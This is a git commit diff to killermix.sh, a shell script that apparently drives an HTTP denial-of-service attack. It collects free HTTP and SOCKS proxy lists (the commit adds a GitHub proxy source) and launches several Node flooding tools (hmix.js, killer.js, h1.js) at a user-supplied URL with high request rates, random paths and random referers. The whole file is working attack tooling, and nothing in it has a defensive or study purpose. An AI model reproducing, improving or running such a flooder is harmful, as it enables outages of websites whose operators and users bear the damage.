ff111482c53ca6715a96ec5a8f6e6e01637c9b57
hackerlove123 <149338972+hackerlove123@users.noreply.github.com>
2025-04-14 07:47:14 +0700

    her

--- killermix.sh
+++ killermix.sh
@@ -6,20 +6,21 @@
 URL=$1
 TIME=$2
 
-# Tải proxy loại HTTP + HTTPS + SOCKS4 + SOCKS5 vào live.txt
-for type in http https socks4 socks5; do
-  curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&timeout=1000&protocol=${type}"
-done > live.txt
+# Tải proxy loại HTTP, HTTPS, SOCKS4, SOCKS5 và thêm 1 URL mặc định vào live.txt
+{
+  for type in http https socks4 socks5; do
+    curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&timeout=1000&protocol=${type}"
+  done
+  curl -s "https://raw.githubusercontent.com/neganok/NGCSLPRX/refs/heads/main/Proxies/http.txt"
+} > live.txt
 
 export NODE_OPTIONS=--max-old-space-size=8192
 
 node hmix.js -m POST -u "$URL" -s "$TIME" -p live.txt -t 1 --full true -d false &
-node killer.js POST "$URL" "$TIME" 1 128 live.txt --query 1 --referer rand --http mix --close --randpath --parsed --reset --multipath 5 &
+node killer.js POST "$URL" "$TIME" 1 48 live.txt --query 1 --referer rand --http mix --close --randpath --parsed --reset --multipath 5 &
 
 node h1.js POST "$URL" live.txt "$TIME" 999 10 randomstring="true" &
 node h1.js GET "$URL" live.txt "$TIME" 999 10 randomstring="true" &
-
-
 
 wait
 pkill -f "hmix.js|h1.js|h1h2.js|http2.js|h1version.js|killer.js"
